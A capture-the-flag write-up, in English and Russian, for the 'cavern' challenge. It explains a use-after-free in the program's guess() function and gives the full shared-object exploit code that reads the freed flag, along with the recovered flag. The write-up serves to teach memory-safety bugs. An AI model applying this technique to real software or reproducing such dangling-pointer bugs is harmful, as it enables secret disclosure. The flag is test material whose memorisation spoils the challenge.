# cavern

**Category** cctf

## Solution

1. I read the challenge description and the supplied `cavern.c`. The program loads a user-provided shared object with `dlopen()`, looks up `run()` using `dlsym()`, and executes that function. I connected to the dedicated Linux challenge container to build and test the shared object.

   ```bash
   ssh a.kaiumova-cavern@osctf.nnk.moe
   pwd
   ls -la
   ```

2. I inspected the `guess()` function and found a use-after-free vulnerability: it stores the decoded flag in the `secret` field of an `offering`, frees the structure, and returns the now-dangling pointer.

   ```c
   offering_free(offering);
   return offering;
   ```

3. I created `offer.c`, exporting the required `void run(void)` function. It calls `guess("hello")`, casts the returned pointer to the matching structure layout, and attempts to recover the 55 bytes of the `secret` field.

   ```bash
   cat > offer.c <<'EOF_C'
   #include <stdio.h>
   #include <string.h>

   #define BUF_SIZE 64

   struct offering {
       char guess[BUF_SIZE];
       char secret[BUF_SIZE];
   };

   extern void *guess(char *your_guess);

   void run(void) {
       struct offering *ptr = (struct offering *)guess("hello");
       printf("Recovered flag: ");
       fwrite(ptr->secret, 1, 55, stdout);
       printf("\n");
   }
   EOF_C
   ```

4. I compiled the source as a position-independent Linux shared object and passed it to `cavern`.

   ```bash
   gcc -shared -fPIC -o offer.so offer.c -ldl
   ./cavern ./offer.so
   ```

5. The program rejected the guess, but the memory read still revealed the flag. I submitted the recovered flag to the CTF bot.

   ```text
   "Wrong," the demons cackle. "Again!"
   Recovered flag: cctf{reMember_tHere_is_no_5po0N_fRee_frOM_Na5Al_deMONs}
   ```

## Подробный разбор

В задании `cavern` мне нужно было вернуть флаг, который программа расшифровывала в памяти, но не раскрывала при неправильной догадке. По условию я могла передать программе собственную динамическую библиотеку. Я использовала это для вызова уязвимой функции и чтения данных из памяти.

### 1. Я подключилась к контейнеру и проверила файлы

```bash
ssh a.kaiumova-cavern@osctf.nnk.moe
pwd
ls -la
```

Для этого задания бот выдал отдельный SSH-контейнер. После подключения я проверила рабочую папку: `pwd` показала `/home/ctf`, а `ls -la` — исполняемый файл `cavern`. Сборку библиотеки нужно было выполнять в Linux-контейнере, потому что `cavern` ожидает Linux shared object (`.so`), а обычная сборка на macOS создала бы библиотеку другого формата.

### 2. Я разобралась, как программа загружает мою библиотеку

В исходном коде `cavern.c` я увидела использование `dlopen()` и `dlsym()`: программа открывает переданную библиотеку, ищет в ней функцию `run()` и вызывает её. Значит, я могла написать собственную функцию `run()`, а затем скомпилировать её в `offer.so`.

Это не означало, что я знаю флаг заранее. Мне нужно было найти способ получить его из уже существующей логики программы.

### 3. Я обнаружила ошибку Use-After-Free

```c
offering_free(offering);
return offering;
```

В функции `guess()` программа создавала структуру `offering`, помещала в её поле `secret` расшифрованный флаг и проверяла мою догадку. Затем она освобождала структуру, но всё равно возвращала указатель на неё.

После `free()` этот указатель становится висячим (*dangling pointer*). Повторное чтение памяти через него называется **Use-After-Free (UAF)**. Освобождение памяти не гарантирует немедленного стирания всех байтов, поэтому я попробовала прочитать поле `secret` до того, как его содержимое будет перезаписано. Такое чтение является неопределённым поведением и не обязано работать в другом запуске или окружении.

### 4. Я написала библиотеку `offer.c`

```bash
cat > offer.c <<'EOF_C'
#include <stdio.h>
#include <string.h>

#define BUF_SIZE 64

struct offering {
    char guess[BUF_SIZE];
    char secret[BUF_SIZE];
};

extern void *guess(char *your_guess);

void run(void) {
    struct offering *ptr = (struct offering *)guess("hello");
    printf("Recovered flag: ");
    fwrite(ptr->secret, 1, 55, stdout);
    printf("\n");
}
EOF_C
```

В своей библиотеке я объявила структуру с двумя массивами по 64 байта, чтобы правильно обратиться к полю `secret` по его смещению. Объявление `extern void *guess(char *your_guess)` позволило вызвать функцию из программы `cavern` при загрузке библиотеки.

В `run()` я передала заведомо неправильную догадку `"hello"`, получила возвращённый указатель и прочитала 55 байтов поля `secret` через `fwrite()`. Здесь `fwrite()` удобнее обычного вывода строки: оно выводит заданное количество байтов и не зависит от наличия завершающего нулевого символа.

### 5. Я скомпилировала библиотеку и запустила `cavern`

```bash
gcc -shared -fPIC -o offer.so offer.c -ldl
./cavern ./offer.so
```

Флаг `-shared` создаёт динамическую библиотеку, а `-fPIC` включает позиционно-независимый код, подходящий для shared object. Опция `-o offer.so` задаёт имя выходного файла. Затем я передала путь к библиотеке программе `cavern`, чтобы она загрузила и вызвала мою функцию `run()`.

### 6. Я получила флаг

```text
"Wrong," the demons cackle. "Again!"
Recovered flag: cctf{reMember_tHere_is_no_5po0N_fRee_frOM_Na5Al_deMONs}
```

Программа сообщила, что догадка неверная, но мой код всё равно прочитал флаг из освобождённой структуры. Таким образом, я обошла необходимость угадывать секрет, используя ошибку управления памятью. Полученный флаг я отправила CTF-боту; задание было засчитано в итоговом счёте.
